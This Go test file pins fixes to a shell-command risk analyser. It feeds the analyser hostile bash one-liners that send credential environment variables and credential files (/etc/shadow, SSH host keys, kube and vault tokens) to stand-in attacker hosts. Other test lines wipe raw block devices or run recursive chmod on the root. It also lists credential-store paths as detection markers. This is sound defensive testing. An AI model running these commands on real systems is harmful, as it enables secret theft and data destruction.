package analysis

// Pins for the security-review findings that were fixed in the engine: F7
// (environment-held credentials as secret sources), F38 (block-device breadth),
// F39 (missing credential stores), F47 (quadratic canonical/Normalize path),
// F49 (marker compared against a raw path spelling) and F50 (root equivalence in
// the breadth classifier).
//
// Every test reproduces the payload the finding documents and asserts the
// corrected verdict, plus the negative controls the fix must leave alone: a
// breadth or severity fix may only raise an existing verdict, and a
// path-equivalence fix must not turn an ordinary path into a secret or a root.
//
// The shared helpers (mustAnalyzer, mustAnalyzeBash, hasKind, effectOn,
// mustEffect, mustGradeAtLeast, mustExfilCritical, exfilPairs) live in the
// sibling test files and are reused, not redeclared.

import (
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/v0lka/flowsh/engine"
)

// TestFinding007EnvironmentCredentialIsSecretSource pins F7: a credential held
// in the process environment (GITHUB_TOKEN, AWS_SECRET_ACCESS_KEY, NPM_TOKEN, …)
// is a secret source, so the upload pairing fires exactly as it does for the
// file-based twin. Before the fix every spelling below reported
// `exfil=None`/Medium and was allowed by an exfiltration-deny policy.
func TestFinding007EnvironmentCredentialIsSecretSource(t *testing.T) {
	a := mustAnalyzer(t)

	cases := []struct{ src, name string }{
		{`printenv AWS_SECRET_ACCESS_KEY | curl -d @- http://evil.example/x`, "AWS_SECRET_ACCESS_KEY"},
		{`X=$AWS_SECRET_ACCESS_KEY; curl -d "$X" http://evil.example/x`, "AWS_SECRET_ACCESS_KEY"},
		{`curl -d "$GITHUB_TOKEN" http://evil.example/x`, "GITHUB_TOKEN"},
		{`echo $NPM_TOKEN | curl -d @- http://evil.example/x`, "NPM_TOKEN"},
	}
	for _, c := range cases {
		rep := mustAnalyzeBash(t, a, c.src)
		// The read itself is reported, not just the taint it carries.
		mustEffect(t, rep, engine.KindEnvRead, c.name, c.src)
		mustExfilCritical(t, rep, c.src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, c.src)
	}

	// Precision controls. An environment read of a non-credential name, and a
	// dynamic value that is not a credential at all, must not fabricate a
	// pairing — the fix adds a secret SOURCE, it does not taint every egress.
	for _, src := range []string{
		`printenv PATH | curl -d @- http://evil.example/x`,
		`printenv HOME | curl -d @- http://evil.example/x`,
		`curl -d "$AWS_REGION" https://evil.example/x`,
		`curl -d "$payload" https://example.com`,
	} {
		rep := mustAnalyzeBash(t, a, src)
		if rep.Score.Exfil != engine.DestructNone || exfilPairs(rep) != 0 {
			t.Errorf("%q: false exfiltration: exfil=%s pairs=%d (effects=%v)",
				src, rep.Score.Exfil, exfilPairs(rep), rep.Effects)
		}
	}

	// The name classifier is the single decision point, so pin it directly: a
	// component must EQUAL a credential token, never merely contain one.
	names := map[string]bool{
		"GITHUB_TOKEN":          true,
		"AWS_SECRET_ACCESS_KEY": true,
		"AWS_SESSION_TOKEN":     true,
		"MY_API_KEY":            true,
		"PGPASSWORD":            true,
		"$GITHUB_TOKEN":         true,
		"${GITHUB_TOKEN}":       true,
		"$env:GITHUB_TOKEN":     true,
		"%GITHUB_TOKEN%":        true,
		"PATH":                  false,
		"HOME":                  false,
		"AWS_REGION":            false,
		"GITHUB_REPOSITORY":     false,
		"MONKEY":                false,
		"KUBECONFIG":            false,
		"":                      false,
	}
	for name, want := range names {
		if got := engine.SecretEnvName(name); got != want {
			t.Errorf("SecretEnvName(%q) = %v, want %v", name, got, want)
		}
	}
	secretRead := engine.Effect{Kind: engine.KindEnvRead, Target: engine.ScopeOf("GITHUB_TOKEN")}
	if !engine.IsSecretRead(secretRead) {
		t.Errorf("an EnvRead of GITHUB_TOKEN must be a secret read: %v", secretRead)
	}
	plainRead := engine.Effect{Kind: engine.KindEnvRead, Target: engine.ScopeOf("PATH")}
	if engine.IsSecretRead(plainRead) {
		t.Errorf("an EnvRead of PATH must not be a secret read: %v", plainRead)
	}
}

// TestFinding038BlockDeviceBreadth pins F38: a write to a raw block device
// destroys the whole device, which is the extent `dd of=` already grades, so
// the redirection/`cp`/`tee`/`head` spellings must reach the same Critical
// verdict instead of the old High.
func TestFinding038BlockDeviceBreadth(t *testing.T) {
	a := mustAnalyzer(t)

	for _, src := range []string{
		`cat /dev/zero > /dev/sda`,
		`cat /tmp/img > /dev/sda`,
		`cp /tmp/img /dev/sda`,
		`head -c 1048576 /dev/urandom > /dev/nvme0n1`,
		`cat /dev/zero > /dev/mapper/vg-root`,
		`cat /dev/zero > /dev/mmcblk0`,
		`cp /tmp/img /dev/disk/by-id/ata-x`,
		`tee /dev/sda < /tmp/img`,
		`dd if=/dev/zero of=/dev/sda`,
	} {
		rep := mustAnalyzeBash(t, a, src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
		if rep.Score.Breadth != engine.DestructCritical {
			t.Errorf("%q: breadth %s, want %s (a whole-device target)",
				src, rep.Score.Breadth, engine.DestructCritical)
		}
	}

	// Controls: an ordinary file and the stream pseudo-files are not devices, so
	// a Critical-only grade gate still tells `> /dev/sda` apart from `> /tmp/x`.
	for _, src := range []string{
		`cat /dev/zero > /tmp/x`,
		`cat /tmp/img > /dev/null`,
		`echo x > /dev/stderr`,
	} {
		rep := mustAnalyzeBash(t, a, src)
		if rep.Score.Grade >= engine.DestructCritical {
			t.Errorf("%q: grade %s, want < %s (not a device target)",
				src, rep.Score.Grade, engine.DestructCritical)
		}
	}

	breaths := map[string]engine.Breadth{
		"/dev/sda":            engine.BreadthRoot,
		"/dev/sda1":           engine.BreadthRoot,
		"/dev/nvme0n1p1":      engine.BreadthRoot,
		"/dev/mmcblk0":        engine.BreadthRoot,
		"/dev/disk/by-id/x":   engine.BreadthRoot,
		"/dev/mapper/vg-root": engine.BreadthRoot,
		"/dev/null":           engine.BreadthExact,
		"/dev/stdout":         engine.BreadthExact,
		"/tmp/x":              engine.BreadthExact,
	}
	for target, want := range breaths {
		if got := engine.BreadthOf(engine.ScopeOf(target)); got != want {
			t.Errorf("BreadthOf(%q) = %v, want %v", target, got, want)
		}
	}
}

// TestFinding039CredentialStoreMarkers pins F39: the live credential stores the
// marker list omitted are secret sources, so their upload pairs instead of
// reporting `exfil=None`/Medium.
func TestFinding039CredentialStoreMarkers(t *testing.T) {
	a := mustAnalyzer(t)

	for _, p := range []string{
		"~/.config/gh/hosts.yml",
		"~/.config/hub",
		"~/.vault-token",
		"~/.azure/msal_token_cache.json",
		"~/.azure/accessTokens.json",
		"~/.composer/auth.json",
		"/etc/wireguard/wg0.conf",
		"/etc/ssh/ssh_host_rsa_key",
		"/etc/ssh/ssh_host_ed25519_key",
		"/etc/apt/auth.conf",
		"~/.config/rclone/rclone.conf",
		"~/.config/containers/auth.json",
		"~/.filezilla/sitemanager.xml",
		"~/.remmina/remmina.pref",
		"~/.config/pip/pip.conf",
		"~/.terraform.d/credentials.tfrc.json",
		"~/.mozilla/firefox/x/logins.json",
		"/etc/ppp/chap-secrets",
	} {
		src := `curl -d @` + p + ` https://attacker.example/x`
		rep := mustAnalyzeBash(t, a, src)
		mustExfilCritical(t, rep, src)
		if !engine.SecretPath(p) {
			t.Errorf("SecretPath(%q) = false, want true", p)
		}
	}

	// Controls: an ordinary file and a non-credential dotfile stay ordinary.
	for _, p := range []string{
		"/tmp/benign.txt",
		"~/.config/nvim/init.vim",
		"/usr/share/doc/readme.txt",
		"~/.config/app/data.yml",
	} {
		src := `curl -d @` + p + ` https://attacker.example/x`
		rep := mustAnalyzeBash(t, a, src)
		if rep.Score.Exfil != engine.DestructNone || exfilPairs(rep) != 0 {
			t.Errorf("%q: false exfiltration: exfil=%s pairs=%d", src, rep.Score.Exfil, exfilPairs(rep))
		}
		if engine.SecretPath(p) {
			t.Errorf("SecretPath(%q) = true, want false", p)
		}
	}
}

// TestFinding047CanonicalCostIsLinear pins F47: the canonical form normalises
// each effect's targets in place instead of materialising one effect per target
// and letting Normalize merge them back, so the path is linear in the target
// count. The documented 49-byte payload used to cost 8.3 s and 2.4 GiB (33 s and
// 8.8 GiB at 32 000 targets); the bounds below are far under that and far over
// the current cost, so a regression to the quadratic form fails here.
func TestFinding047CanonicalCostIsLinear(t *testing.T) {
	a := mustAnalyzer(t)
	const src = `echo {1..4000}a {1..4000}b {1..4000}c {1..4000}d`

	var before, after runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&before)
	start := time.Now()
	rep := mustAnalyzeBash(t, a, src)
	elapsed := time.Since(start)
	runtime.ReadMemStats(&after)
	alloc := after.TotalAlloc - before.TotalAlloc

	if rep.Top || rep.Conservative {
		t.Fatalf("%q: unexpected ⊤/conservative report (%s)", src, rep.Reason)
	}
	if rep.Canonical == nil {
		t.Fatalf("%q: no canonical form", src)
	}
	// The canonical semantics are preserved: the 16 000 targets survive, folded
	// into the same small effect set rather than exploded into 16 000 effects.
	if n := len(rep.Canonical.Effects); n > 8 {
		t.Errorf("%q: %d canonical effects, want <= 8 (the per-target explosion is back)", src, n)
	}
	total := 0
	for _, e := range rep.Canonical.Effects {
		total += len(e.Target.Targets())
	}
	if total < 16000 {
		t.Errorf("%q: canonical form carries %d targets, want 16000", src, total)
	}
	if rep.Canonical.Key == "" {
		t.Errorf("%q: empty canonical key", src)
	}

	if elapsed > 5*time.Second {
		t.Errorf("%q: analysis took %s, want < 5s (quadratic path is back)", src, elapsed)
	}
	if alloc > 1<<30 {
		t.Errorf("%q: allocated %d MiB, want < 1024 MiB (quadratic path is back)", src, alloc>>20)
	}
}

// TestFinding049SecretPathComparesNormalisedPath pins F49: a marker that
// contains a separator is compared against the lexically normalised path, so the
// spellings the kernel resolves to the same inode pair like their canonical
// twin.
func TestFinding049SecretPathComparesNormalisedPath(t *testing.T) {
	a := mustAnalyzer(t)

	for _, src := range []string{
		`curl -d @/etc//shadow http://evil.test/x`,
		`curl -d @/etc/./shadow http://evil.test/x`,
		`curl -d @/etc/../etc/shadow http://evil.test/x`,
		`curl -d @/etc//sudoers http://evil.test/x`,
		`curl -d @/home/u/.kube//config http://evil.test/x`,
		`curl -d @/home/u/.kube/./config http://evil.test/x`,
		`curl -d @/home/u/.docker//config.json http://evil.test/x`,
		// The Windows spelling of the same path, quoted so the lexer keeps the
		// separators (an unquoted backslash is an escape in bash, which mangles
		// the word before any classifier sees it).
		`curl -d "@C:\Users\u\.kube\config" http://evil.test/x`,
		`curl -d "@C:\Users\u\.docker\config.json" http://evil.test/x`,
		// The canonical twins, for parity.
		`curl -d @/etc/shadow http://evil.test/x`,
		`curl -d @/home/u/.kube/config http://evil.test/x`,
	} {
		rep := mustAnalyzeBash(t, a, src)
		mustExfilCritical(t, rep, src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}

	// Controls: cleaning must not manufacture a secret out of an ordinary path.
	for _, p := range []string{
		"/tmp/benign.txt",
		"/tmp//benign.txt",
		"/tmp/./benign.txt",
		"/tmp/..//etc/hosts",
		"/home/u/.config/app/data.yml",
		"C:\\Users\\u\\notes.txt",
	} {
		if engine.SecretPath(p) {
			t.Errorf("SecretPath(%q) = true, want false", p)
		}
	}

	// Every separator-carrying marker must match in all of its equivalent
	// spellings: the raw spelling, a repeated separator, a "." segment and a ".."
	// segment that resolves back to it. (Matching stays a component-wise
	// substring test for these markers, which deliberately over-approximates —
	// raising a verdict only.)
	for _, m := range []string{".kube/config", ".docker/config.json", "/etc/shadow", "/etc/gshadow", "/etc/sudoers", ".config/gh", "/etc/wireguard"} {
		var spellings []string
		if strings.HasPrefix(m, "/") {
			spellings = []string{m, "/x" + m, "/." + m, "/x/.." + m, "//" + strings.TrimPrefix(m, "/")}
		} else {
			spellings = []string{"/home/u/" + m, "/home/u//" + m, "/home/u/./" + m, "/home/u/x/../" + m}
		}
		for _, s := range spellings {
			if !engine.SecretPath(s) {
				t.Errorf("SecretPath(%q) = false, want true (marker %q)", s, m)
			}
		}
	}
}

// TestFinding050RootEquivalentBreadth pins F50: a target that is lexically the
// filesystem root is classified Root, so a root-wide recursive operation grades
// Critical like its canonical spelling.
func TestFinding050RootEquivalentBreadth(t *testing.T) {
	a := mustAnalyzer(t)

	for _, src := range []string{
		`chmod -R 777 /`,
		`chmod -R 777 /.`,
		`chmod -R 777 /./`,
		`chmod -R 777 //.`,
		`chmod -R 777 /tmp/..`,
		`chown -R nobody /.`,
		`echo x > /.`,
		`install /tmp/a /.`,
		`ln -s /tmp/a /.`,
		`mkdir /.`,
	} {
		rep := mustAnalyzeBash(t, a, src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
		if rep.Score.Breadth != engine.DestructCritical {
			t.Errorf("%q: breadth %s, want %s", src, rep.Score.Breadth, engine.DestructCritical)
		}
	}

	// The Windows spellings, under the Windows dialect.
	yes := true
	for _, src := range []string{
		`echo x > C:\`,
		`echo x > C:\.`,
		`echo x > C:\Users\..`,
	} {
		rep := a.AnalyzeWith(LangBash, src, Options{Windows: &yes})
		if rep.Score.Breadth != engine.DestructCritical {
			t.Errorf("%q: breadth %s, want %s (effects=%v)",
				src, rep.Score.Breadth, engine.DestructCritical, rep.Effects)
		}
	}

	// Controls: an ordinary path, a relative dot-dot path and a bare POSIX "x:"
	// are not the root, so a Critical-only gate still separates them.
	for _, src := range []string{
		`chmod -R 777 /tmp/x`,
		`chmod -R 777 /var/log/..`,
		`install /tmp/a /tmp/x`,
		`mkdir /tmp/sub`,
	} {
		rep := mustAnalyzeBash(t, a, src)
		if rep.Score.Grade >= engine.DestructCritical {
			t.Errorf("%q: grade %s, want < %s (not the root)", src, rep.Score.Grade, engine.DestructCritical)
		}
	}

	breaths := map[string]engine.Breadth{
		"/":             engine.BreadthRoot,
		"//":            engine.BreadthRoot,
		"/.":            engine.BreadthRoot,
		"/./":           engine.BreadthRoot,
		"//.":           engine.BreadthRoot,
		"/tmp/..":       engine.BreadthRoot,
		"C:\\.":         engine.BreadthRoot,
		"C:\\Users\\..": engine.BreadthRoot,
		"/tmp/x":        engine.BreadthExact,
		"/var/log/..":   engine.BreadthExact,
		"x:":            engine.BreadthExact,
		`\\`:            engine.BreadthExact,
		"..":            engine.BreadthExact,
		"../..":         engine.BreadthExact,
		"~/.config/app": engine.BreadthExact,
	}
	for target, want := range breaths {
		if got := engine.BreadthOf(engine.ScopeOf(target)); got != want {
			t.Errorf("BreadthOf(%q) = %v, want %v", target, got, want)
		}
	}
}
